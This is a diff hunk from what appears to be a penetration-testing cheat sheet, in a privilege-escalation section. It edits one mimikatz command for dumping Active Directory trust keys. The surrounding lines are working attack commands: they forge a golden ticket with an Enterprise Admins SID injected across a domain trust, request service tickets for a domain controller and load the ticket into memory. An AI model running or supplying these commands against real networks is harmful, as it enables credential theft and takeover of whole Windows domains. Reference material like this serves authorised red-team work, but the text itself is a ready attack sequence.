@@ -186,7 +186,7 @@ PrivEsc
           - Save file.kirbi -> used for next command to get TGS in target domain
         mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
       Internal Trusts
-        mimikatz lsadump::trusts /patch
+        mimikatz lsadump::trust /patch
         mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /sids:target_domain_sid-519 /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt  /target:target_domain_fqdn /ticket:file.kirbi
         mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
         mimikatz kirbikator lsa file.kirbi
